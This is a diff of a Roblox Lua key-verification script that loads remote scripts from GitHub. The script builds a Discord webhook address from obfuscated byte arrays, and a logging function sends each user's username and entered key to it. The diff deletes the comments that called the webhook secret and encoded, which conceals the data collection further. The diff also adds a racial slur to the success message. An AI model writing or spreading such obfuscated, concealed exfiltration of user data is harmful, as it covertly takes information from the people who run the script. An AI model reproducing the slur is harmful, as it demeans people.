@@ -51,7 +51,7 @@ local scriptMap = {
     [117946920443617] = "https://raw.githubusercontent.com/SemionInThesius/Cooking-Recipe/refs/heads/main/Cooking%20waste.lua"
 }
 
--- 🕵️‍♂️ Webhook (gizli, parça parça kodlanmış)
+-- 🕵️‍♂️
 local a1 = {104,116,116,112,115,58,47,47}
 local a2 = {100,105,115,99,111,114,100,46,99,111,109}
 local a3 = {47,97,112,105,47,119,101,98,104,111,111,107,115,47}
@@ -129,7 +129,7 @@ verifyBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
 verifyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 Instance.new("UICorner", verifyBtn).CornerRadius = UDim.new(0, 10)
 
--- 🧾 Webhook log fonksiyonu
+
 local function sendLog(username, enteredKey, status)
     local color = status and 65280 or 16711680
     local embed = {
@@ -171,8 +171,9 @@ local function checkKey()
 
     -- 🎉 Access Granted UI + Ses
     local grantedFrame = Instance.new("Frame", gui)
-    grantedFrame.Size = UDim2.new(0, 300, 0, 100)
-    grantedFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
+    grantedFrame.Size = UDim2.new(0, 600, 0, 100)
+	grantedFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+    grantedFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
     grantedFrame.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
     grantedFrame.BackgroundTransparency = 1
     Instance.new("UICorner", grantedFrame).CornerRadius = UDim.new(0, 10)
@@ -180,7 +181,7 @@ local function checkKey()
     local grantedLabel = Instance.new("TextLabel", grantedFrame)
     grantedLabel.Size = UDim2.new(1, 0, 1, 0)
     grantedLabel.BackgroundTransparency = 1
-    grantedLabel.Text = "✅ Access Granted"
+    grantedLabel.Text = "✅ Access Granted, Enjoy it my nigga"
     grantedLabel.Font = Enum.Font.GothamBlack
     grantedLabel.TextSize = 28
     grantedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
